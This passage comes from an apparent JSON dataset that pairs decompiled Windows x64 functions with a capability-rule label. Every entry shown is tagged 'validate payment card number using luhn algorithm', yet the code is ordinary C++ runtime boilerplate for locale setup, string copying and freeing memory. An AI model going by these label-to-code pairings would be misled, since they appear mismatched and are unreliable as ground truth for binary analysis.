*0x1400f9fd8 = 0;\n    *0x1400f9fdc = 0;\n    *0x1400f9fe0 = 0;\n    *0x1400f9fe4 = 0;\n    *0x1400f9fe8 = 0;\n    *0x1400f9fec = 0;\n    *0x1400f9ff0 = 0;\n    *0x1400f9ff4 = 0;\n    *0x1400f9ff8 = 0;\n    *0x1400f9ffc = 0;\n    *0x1400fa000 = 0;\n    *0x1400fa004 = 0;\n    *0x1400fa008 = 0;\n    *0x1400fa00c = 0;\n    *0x1400fa010 = 0;\n    *0x1400fa014 = 0;\n    *0x1400fa018 = 0;\n    *0x1400fa01c = 0;\n    *0x1400fa020 = 0;\n    *0x1400fa024 = 0;\n    *0x1400fa028 = 0;\n    *0x1400fa02c = 0;\n    *0x1400fa030 = 0;\n    *0x1400fa034 = 0;\n    *0x1400fa038 = 0;\n    *0x1400fa03c = 0;\n    fcn.14007a800(0x1400f9a20, 0x1400f9ec0, 1);\n    fcn.14009dcf0(arg1, *0x140102c30, 0x1400f9a20);\n    *0x1400f9958 = 1;\n    *0x1400f9950 = *0x140103180 + 0x10;\n    fcn.14009dcf0(arg1, *0x140102e30, 0x1400f9950);\n    *0x1400f9978 = 1;\n    *0x1400f9970 = *0x140103560 + 0x10;\n    fcn.14009dcf0(arg1, *0x140102fe0, 0x1400f9970);\n    fcn.1400aaea0(0x1400f98e0, 1);\n    fcn.14009dcf0(arg1, *0x140102df0, 0x1400f98e0);\n    *0x1400f9988 = 1;\n    *0x1400f9980 = *0x140103490 + 0x10;\n    fcn.14009dcf0(arg1, *0x140102eb0, 0x1400f9980);\n    *0x1400f9998 = 1;\n    *0x1400f9990 = *0x140103470 + 0x10;\n    fcn.14009dcf0(arg1, *0x140102e90, 0x1400f9990);\n    *0x1400f9b48 = 1;\n    *0x1400f9b40 = *0x140103480 + 0x10;\n    fcn.14009dcf0(arg1, *0x140102ea0, 0x1400f9b40);\n    *0x1400f9b58 = 1;\n    *0x1400f9b50 = *0x140103460 + 0x10;\n    fcn.14009dcf0(arg1, *0x140102e80, 0x1400f9b50);\n    fcn.14009cb40(arg1, auStack168);\n    iVar5 = *(arg1 + 6);\n    iVar3 = fcn.1400261c0(*0x140102e00);\n    uVar1 = *0x140102d80;\n    *(iVar5 + iVar3 * 8) = 0x1400f9ba0;\n    iVar5 = *(arg1 + 6);\n    iVar3 = fcn.1400261c0(uVar1);\n    uVar1 = *0x140102d90;\n    *(iVar5 + iVar3 * 8) = 0x1400fa060;\n    iVar5 = *(arg1 + 6);\n    iVar3 = fcn.1400261c0(uVar1);\n    uVar1 = *0x140102c20;\n    *(iVar5 + iVar3 * 8) = 0x1400fa0e0;\n    iVar5 = *(arg1 + 6);\n    iVar3 = fcn.1400261c0(uVar1);\n    uVar1 = *0x140102e10;\n    *(iVar5 + iVar3 * 8) = 0x1400f9d20;\n    iVar5 = *(arg1 + 6);\n    iVar3 = fcn.1400261c0(uVar1);\n    uVar1 = *0x140102da0;\n    *(iVar5 + iVar3 * 8) = 0x1400f9c40;\n    iVar5 = *(arg1 + 6);\n    iVar3 = fcn.1400261c0(uVar1);\n    uVar1 = *0x140102db0;\n    *(iVar5 + iVar3 * 8) = 0x1400fa160;\n    iVar5 = *(arg1 + 6);\n    iVar4 = fcn.1400261c0(uVar1);\n    uVar1 = *0x140102c30;\n    iVar3 = *(arg1 + 6);\n    *(iVar5 + iVar4 * 8) = 0x1400fa1e0;\n    iVar5 = fcn.1400261c0(uVar1);\n    *(iVar3 + iVar5 * 8) = 0x1400f9ec0;\n    return;\n}\n",
        "token_count": 7151
    },
    "14009f6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14009f6c0(void)\n\n{\n    if (**0x140102a70 != 0) {\n        fcn.14000e8c0(0x1400fb750, 0x14009f780);\n        return *0x1400fb740;\n    }\n    if (*0x1400fb740 != 0) {\n        return *0x1400fb740;\n    }\n    fcn.14009f750(0x1400fb740, 0x140103d90);\n    return *0x1400fb740;\n}\n",
        "token_count": 129
    },
    "14009fc3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14009fc30(int64_t arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    \n    piVar5 = *(arg1 + 0x10);\n    if (piVar5 == NULL) {\n        piVar5 = fcn.1400b6520(0x70);\n        iVar2 = *0x1401033d0;\n        *(piVar5 + 1) = 0;\n        piVar5[2] = 0;\n        *piVar5 = iVar2 + 0x10;\n        piVar5[3] = 0;\n        *(piVar5 + 4) = 0;\n        *(piVar5 + 0x21) = 0;\n        piVar5[5] = 0;\n        piVar5[6] = 0;\n        piVar5[7] = 0;\n        piVar5[8] = 0;\n        piVar5[9] = 0;\n        piVar5[10] = 0;\n        *(piVar5 + 0xb) = 0;\n        *(piVar5 + 0x5c) = 0;\n        *(piVar5 + 0x6f) = 0;\n        *(arg1 + 0x10) = piVar5;\n    }\n    *(piVar5 + 0x21) = 0x2e;\n    *(*(arg1 + 0x10) + 0x22) = 0x2c;\n    iVar2 = *(arg1 + 0x10);\n    *(iVar2 + 0x10) = 0x1400fd5e0;\n    *(iVar2 + 0x28) = 0x1400fd5e0;\n    *(iVar2 + 0x38) = 0x1400fd5e0;\n    *(iVar2 + 0x48) = 0x1400fd5e0;\n    puVar3 = *0x140102bc0;\n    *(iVar2 + 0x18) = 0;\n    uVar1 = *puVar3;\n    *(iVar2 + 0x30) = 0;\n    *(iVar2 + 0x40) = 0;\n    *(iVar2 + 0x50) = 0;\n    *(iVar2 + 0x58) = 0;\n    *(iVar2 + 0x5c) = uVar1;\n    *(*(arg1 + 0x10) + 0x60) = uVar1;\n    iVar2 = **0x140102bd0;\n    iVar4 = 0;\n    do {\n        *(*(arg1 + 0x10) + 100 + iVar4) = *(iVar2 + iVar4);\n        iVar4 = iVar4 + 1;\n    } while (iVar4 != 0xb);\n    return;\n}\n",
        "token_count": 657
    },
    "14009fff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14009fff0(int64_t arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    \n    piVar5 = *(arg1 + 0x10);\n    if (piVar5 == NULL) {\n        piVar5 = fcn.1400b6520(0x70);\n        iVar2 = *0x1401033e0;\n        *(piVar5 + 1) = 0;\n        piVar5[2] = 0;\n        *piVar5 = iVar2 + 0x10;\n        piVar5[3] = 0;\n        *(piVar5 + 4) = 0;\n        *(piVar5 + 0x21) = 0;\n        piVar5[5] = 0;\n        piVar5[6] = 0;\n        piVar5[7] = 0;\n        piVar5[8] = 0;\n        piVar5[9] = 0;\n        piVar5[10] = 0;\n        *(piVar5 + 0xb) = 0;\n        *(piVar5 + 0x5c) = 0;\n        *(piVar5 + 0x6f) = 0;\n        *(arg1 + 0x10) = piVar5;\n    }\n    *(piVar5 + 0x21) = 0x2e;\n    *(*(arg1 + 0x10) + 0x22) = 0x2c;\n    iVar2 = *(arg1 + 0x10);\n    *(iVar2 + 0x10) = 0x1400fd5e0;\n    *(iVar2 + 0x28) = 0x1400fd5e0;\n    *(iVar2 + 0x38) = 0x1400fd5e0;\n    *(iVar2 + 0x48) = 0x1400fd5e0;\n    puVar3 = *0x140102bc0;\n    *(iVar2 + 0x18) = 0;\n    uVar1 = *puVar3;\n    *(iVar2 + 0x30) = 0;\n    *(iVar2 + 0x40) = 0;\n    *(iVar2 + 0x50) = 0;\n    *(iVar2 + 0x58) = 0;\n    *(iVar2 + 0x5c) = uVar1;\n    *(*(arg1 + 0x10) + 0x60) = uVar1;\n    iVar2 = **0x140102bd0;\n    iVar4 = 0;\n    do {\n        *(*(arg1 + 0x10) + 100 + iVar4) = *(iVar2 + iVar4);\n        iVar4 = iVar4 + 1;\n    } while (iVar4 != 0xb);\n    return;\n}\n",
        "token_count": 657
    },
    "1400a03b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a03b0(int64_t arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint *puVar4;\n    int64_t iVar5;\n    int64_t *piVar6;\n    \n    piVar6 = *(arg1 + 0x10);\n    if (piVar6 == NULL) {\n        piVar6 = fcn.1400b6520(0x80);\n        iVar2 = *0x1401033f0;\n        *(piVar6 + 1) = 0;\n        piVar6[2] = 0;\n        *piVar6 = iVar2 + 0x10;\n        piVar6[3] = 0;\n        *(piVar6 + 4) = 0;\n        *(piVar6 + 0x22) = 0;\n        piVar6[5] = 0;\n        piVar6[6] = 0;\n        piVar6[7] = 0;\n        piVar6[8] = 0;\n        piVar6[9] = 0;\n        piVar6[10] = 0;\n        *(piVar6 + 0xb) = 0;\n        *(piVar6 + 0x5c) = 0;\n        *(piVar6 + 0x7a) = 0;\n        *(arg1 + 0x10) = piVar6;\n    }\n    uVar1 = *0x1400fd5e4;\n    piVar6[3] = 0;\n    piVar6[2] = 0x1400fd5e0;\n    *(piVar6 + 0x22) = uVar1;\n    piVar6[5] = 0x1400fd5e2;\n    piVar6[7] = 0x1400fd5e2;\n    piVar6[9] = 0x1400fd5e2;\n    puVar4 = *0x140102bc0;\n    piVar6[6] = 0;\n    uVar1 = *puVar4;\n    piVar6[8] = 0;\n    piVar6[10] = 0;\n    *(piVar6 + 0x5c) = uVar1;\n    *(piVar6 + 0xb) = 0;\n    *(*(arg1 + 0x10) + 0x60) = uVar1;\n    iVar2 = *(arg1 + 0x10);\n    iVar3 = **0x140102bd0;\n    iVar5 = 0;\n    do {\n        *(iVar2 + 100 + iVar5 * 2) = *(iVar3 + iVar5);\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0xb);\n    return;\n}\n",
        "token_count": 628
    },
    "1400a078": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a0780(int64_t arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint *puVar4;\n    int64_t iVar5;\n    int64_t *piVar6;\n    \n    piVar6 = *(arg1 + 0x10);\n    if (piVar6 == NULL) {\n        piVar6 = fcn.1400b6520(0x80);\n        iVar2 = *0x140103400;\n        *(piVar6 + 1) = 0;\n        piVar6[2] = 0;\n        *piVar6 = iVar2 + 0x10;\n        piVar6[3] = 0;\n        *(piVar6 + 4) = 0;\n        *(piVar6 + 0x22) = 0;\n        piVar6[5] = 0;\n        piVar6[6] = 0;\n        piVar6[7] = 0;\n        piVar6[8] = 0;\n        piVar6[9] = 0;\n        piVar6[10] = 0;\n        *(piVar6 + 0xb) = 0;\n        *(piVar6 + 0x5c) = 0;\n        *(piVar6 + 0x7a) = 0;\n        *(arg1 + 0x10) = piVar6;\n    }\n    uVar1 = *0x1400fd5e4;\n    piVar6[3] = 0;\n    piVar6[2] = 0x1400fd5e0;\n    *(piVar6 + 0x22) = uVar1;\n    piVar6[5] = 0x1400fd5e2;\n    piVar6[7] = 0x1400fd5e2;\n    piVar6[9] = 0x1400fd5e2;\n    puVar4 = *0x140102bc0;\n    piVar6[6] = 0;\n    uVar1 = *puVar4;\n    piVar6[8] = 0;\n    piVar6[10] = 0;\n    *(piVar6 + 0x5c) = uVar1;\n    *(piVar6 + 0xb) = 0;\n    *(*(arg1 + 0x10) + 0x60) = uVar1;\n    iVar2 = *(arg1 + 0x10);\n    iVar3 = **0x140102bd0;\n    iVar5 = 0;\n    do {\n        *(iVar2 + 100 + iVar5 * 2) = *(iVar3 + iVar5);\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0xb);\n    return;\n}\n",
        "token_count": 625
    },
    "1400a3d1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a3d10(ulong param_1, uchar *param_2, int64_t param_3)\n\n{\n    int64_t *piVar1;\n    uchar *puVar2;\n    uint64_t uVar3;\n    uchar *puVar4;\n    uint64_t uStack128;\n    int64_t *piStack120;\n    int64_t **ppiStack112;\n    uchar *puStack104;\n    ulong uStack88;\n    \n    ppiStack112 = 0x1400fdf80;\n    fcn.1400b7080(0x1400fdf80);\n    *ppiStack112 = ppiStack112 + 2;\n    if ((param_2 == NULL) && (param_3 != 0)) {\n        piVar1 = 0x1400fea48;\n        uStack88 = 0x1400a3d60;\n        fcn.1400b7080(0x1400fea48);\n        piVar1[1] = 0;\n        *piVar1 = piVar1 + 2;\n        *(piVar1 + 2) = 0;\n        return;\n    }\n    puVar4 = param_2 + param_3;\n    piStack120 = puVar4 + -param_2;\n    if (piStack120 < 0x10) {\n        piVar1 = *ppiStack112;\n        if (piStack120 == 0x1) {\n            *piVar1 = *param_2;\n            ppiStack112[1] = 0x1;\n            *(*ppiStack112 + 1) = 0;\n            return;\n        }\n        if (piStack120 == NULL) {\n            ppiStack112[1] = NULL;\n            *piVar1 = 0;\n            return;\n        }\n    }\n    else {\n        if (piStack120 >> 0x3e != 0) {\n            piVar1 = 0x1400fe8c0;\n            puStack104 = 0x1400a1166;\n            puVar2 = param_2;\n            fcn.1400b7170(0x1400fe8c0);\n            uVar3 = puVar4 - puVar2;\n            uStack128 = uVar3;\n            puStack104 = param_2;\n            if (uVar3 < 0x10) {\n                puVar4 = *piVar1;\n                if (uVar3 == 1) {\n                    *puVar4 = *puVar2;\n                    piVar1[1] = 1;\n                    *(*piVar1 + 1) = 0;\n                    return;\n                }\n                if (uVar3 == 0) {\n                    piVar1[1] = 0;\n                    *puVar4 = 0;\n                    return;\n                }\n            }\n            else {\n                puVar4 = fcn.1400a3300(piVar1, &stack0xffffffffffffff80, 0);\n                *piVar1 = puVar4;\n                piVar1[2] = uStack128;\n            }\n            sub.msvcrt.dll_memcpy(puVar4, puVar2, uVar3);\n            piVar1[1] = uStack128;\n            *(*piVar1 + uStack128) = 0;\n            return;\n        }\n        puStack104 = 0x1400a1132;\n        piVar1 = fcn.1400b6520(piStack120 + 1);\n        ppiStack112[2] = piStack120;\n        *ppiStack112 = piVar1;\n    }\n    puStack104 = 0x1400a1147;\n    sub.msvcrt.dll_memcpy(piVar1, param_2, piStack120);\n    ppiStack112[1] = piStack120;\n    *(*ppiStack112 + piStack120) = 0;\n    return;\n}\n",
        "token_count": 850
    },
    "1400a422": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a4220(int64_t *arg1)\n\n{\n    if (*arg1 != arg1 + 2) {\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_free)(*arg1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "1400a433": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a4330(int64_t arg1, ulong s)\n\n{\n    sub.msvcrt.dll_strlen(s);\n    fcn.1400a0b80(arg1, 0, *(arg1 + 8), s);\n    return;\n}\n",
        "token_count": 58
    },
    "1400a43f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1400a43f0(int64_t *arg1, int64_t arg2)\n\n{\n    return *arg1 + arg2;\n}\n",
        "token_count": 37
    },
    "1400aaaa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400aaaa0(ulong *arg1)\n\n{\n    *arg1 = 0x14010a140;\n    fcn.14009f7a0(arg1 + 2);\n    return;\n}\n",
        "token_count": 49
    },
    "1400aac5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400aac50(ulong *arg1)\n\n{\n    *arg1 = 0x14010a180;\n    fcn.14009f7a0(arg1 + 2);\n    return;\n}\n",
        "token_count": 49
    },
    "1400aacd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400aacd0(ulong *arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x14010a1c0;\n    uVar1 = fcn.14009f6c0();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 90
    },
    "1400aad7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400aad70(ulong *arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x14010a1c0;\n    uVar1 = fcn.14009f6c0();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 89
    },
    "1400aaea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400aaea0(ulong *arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x14010a200;\n    uVar1 = fcn.14009f6c0();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 88
    },
    "1400aaf4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400aaf40(ulong *arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x14010a200;\n    uVar1 = fcn.14009f6c0();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 88
    },
    "1400ab02": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400ab020(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    \n    piVar3 = *(arg1 + 0x10);\n    if (piVar3 == NULL) {\n        piVar3 = fcn.1400b6520(0x90);\n        iVar1 = *0x140103380;\n        *(piVar3 + 1) = 0;\n        piVar3[2] = 0;\n        *piVar3 = iVar1 + 0x10;\n        piVar3[3] = 0;\n        *(piVar3 + 4) = 0;\n        piVar3[5] = 0;\n        piVar3[6] = 0;\n        piVar3[7] = 0;\n        piVar3[8] = 0;\n        *(piVar3 + 9) = 0;\n        *(piVar3 + 0x11) = 0;\n        *(arg1 + 0x10) = piVar3;\n    }\n    piVar3[3] = 0;\n    piVar3[2] = 0x1400fd600;\n    *(piVar3 + 4) = 0;\n    *(piVar3 + 9) = 0x2e;\n    *(*(arg1 + 0x10) + 0x49) = 0x2c;\n    iVar1 = **0x140102ba0;\n    iVar2 = 0;\n    do {\n        *(*(arg1 + 0x10) + 0x4a + iVar2) = *(iVar1 + iVar2);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != 0x24);\n    iVar1 = **0x140102b90;\n    iVar2 = 0;\n    do {\n        *(*(arg1 + 0x10) + 0x6e + iVar2) = *(iVar1 + iVar2);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != 0x1a);\n    iVar1 = *(arg1 + 0x10);\n    *(iVar1 + 0x28) = 0x1400fd601;\n    *(iVar1 + 0x30) = 4;\n    *(iVar1 + 0x38) = 0x1400fd606;\n    *(iVar1 + 0x40) = 5;\n    return;\n}\n",
        "token_count": 554
    },
    "1400ab3d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400ab3d0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    uint uVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    \n    piVar4 = *(arg1 + 0x10);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.1400b6520(0xd0);\n        iVar1 = *0x140103390;\n        *(piVar4 + 1) = 0;\n        piVar4[2] = 0;\n        *piVar4 = iVar1 + 0x10;\n        piVar4[3] = 0;\n        *(piVar4 + 4) = 0;\n        piVar4[5] = 0;\n        piVar4[6] = 0;\n        piVar4[7] = 0;\n        piVar4[8] = 0;\n        *(piVar4 + 9) = 0;\n        *(piVar4 + 0x19) = 0;\n        *(arg1 + 0x10) = piVar4;\n    }\n    uVar2 = *0x1400fd624;\n    piVar4[3] = 0;\n    piVar4[2] = 0x1400fd600;\n    *(piVar4 + 9) = uVar2;\n    piVar3 = *0x140102ba0;\n    *(piVar4 + 4) = 0;\n    iVar1 = *piVar3;\n    iVar5 = 0;\n    do {\n        *(piVar4 + iVar5 * 2 + 0x4c) = *(iVar1 + iVar5);\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0x24);\n    iVar1 = **0x140102b90;\n    iVar5 = 0;\n    do {\n        *(piVar4 + iVar5 * 2 + 0x94) = *(iVar1 + iVar5);\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0x1a);\n    piVar4[6] = 4;\n    piVar4[5] = 0x1400fd60c;\n    piVar4[7] = 0x1400fd616;\n    piVar4[8] = 5;\n    return;\n}\n",
        "token_count": 537
    },
    "1400abc2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400abc20(ulong *arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x14010c040;\n    uVar1 = fcn.14009f6c0();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 87
    },
    "1400abd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400abd80(ulong *arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x14010c0a0;\n    uVar1 = fcn.14009f6c0();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 89
    },
    "1400ac02": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400ac020(ulong *arg1)\n\n{\n    *arg1 = 0x14010c100;\n    fcn.14009f7a0(arg1 + 2);\n    return;\n}\n",
        "token_count": 49
    },
    "1400ac1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400ac1d0(ulong *arg1)\n\n{\n    *arg1 = 0x14010c140;\n    fcn.14009f7a0(arg1 + 2);\n    return;\n}\n",
        "token_count": 51
    },
    "1400ac89": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400ac890(int64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    \n    for (puVar1 = *(arg1 + 0x28); puVar1 != NULL; puVar1 = *puVar1) {\n        (*puVar1[1])(arg2, arg1, *(puVar1 + 2));\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "1400ac93": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400ac930(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    ulong *puVar3;\n    int32_t *piVar4;\n    \n    piVar4 = *0x140102a70;\n    puVar3 = *(arg1 + 0x28);\n    while (puVar3 != NULL) {\n        if (*piVar4 == 0) {\n            iVar2 = *(puVar3 + 0x14);\n            *(puVar3 + 0x14) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = puVar3 + 0x14;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar2 != 0) break;\n        puVar3 = *puVar3;\n        fcn.1400b64d0();\n    }\n    *(arg1 + 0x28) = 0;\n    return;\n}\n",
        "token_count": 228
    },
    "1400ad17": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1400ad170(ulong arg1, int64_t arg2, ulong arg3)\n\n{\n    fcn.14009fa10(arg1, arg2 + 0xd0);\n    fcn.14009fb80(arg2 + 0xd0, arg3);\n    fcn.1400ac890(arg2, 1);\n    return arg1;\n}\n",
        "token_count": 83
    },
    "1400ad20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400ad200(int64_t arg1)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uchar auStack32 [16];\n    \n    uVar4 = *0x140100efc;\n    uVar3 = *0x140100ef8;\n    uVar2 = *0x140100ef4;\n    uVar1 = *0x140100ef0;\n    *(arg1 + 0x18) = 0x1002;\n    *(arg1 + 8) = uVar1;\n    *(arg1 + 0xc) = uVar2;\n    *(arg1 + 0x10) = uVar3;\n    *(arg1 + 0x14) = uVar4;\n    fcn.14009fa40(auStack32);\n    fcn.14009fb80(arg1 + 0xd0, auStack32);\n    fcn.14009fb20(auStack32);\n    return;\n}\n",
        "token_count": 225
    },
    "1400ad8e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400ad8e0(ulong *arg1, ulong noname_1, ulong noname_2, int64_t arg4)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg4 != 0;\n    *arg1 = 0x14010c390;\n    uVar1 = fcn.14009f6c0();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 101
    },
    "1400ad93": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400ad930(ulong *arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x14010c390;\n    uVar1 = fcn.14009f6c0();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 87
    },
    "1400ad9d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400ad9d0(ulong *arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x14010c390;\n    uVar1 = fcn.14009f6c0();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 89
    },
    "1400adab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400adab0(ulong *arg1, ulong noname_1, ulong noname_2, int64_t arg4)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg4 != 0;\n    *arg1 = 0x14010c3d0;\n    uVar1 = fcn.14009f6c0();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 102
    },
    "1400adb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400adb00(ulong *arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x14010c3d0;\n    uVar1 = fcn.14009f6c0();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 89
    },
    "1400adba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400adba0(ulong *arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x14010c3d0;\n    uVar1 = fcn.14009f6c0();\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 90
    },
    "1400adc8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
